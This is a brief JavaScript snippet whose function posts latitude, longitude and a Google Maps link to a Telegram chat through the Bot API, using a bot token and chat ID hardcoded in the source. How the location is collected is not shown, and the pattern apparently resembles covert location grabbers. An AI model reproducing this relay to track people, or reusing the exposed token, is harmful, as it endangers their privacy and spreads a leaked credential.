const botToken = "7607952206:AAEssXN2JHqnV9AATiQQj6ga8if3PmYZ_Uc";  // From @BotFather
const chatId = "6255459316";      // From @userinfobot
function sendToTelegram(lat, lon) {
  const botToken = "7607952206:AAEssXN2JHqnV9AATiQQj6ga8if3PmYZ_Uc";
  const chatId = "6255459316";
  const message = `New location:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;

  console.log("Sending to Telegram:", message); // DEBUG

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(res => res.json())
  .then(data => console.log("Telegram response:", data))
  .catch(err => console.error("Telegram error:", err));
}
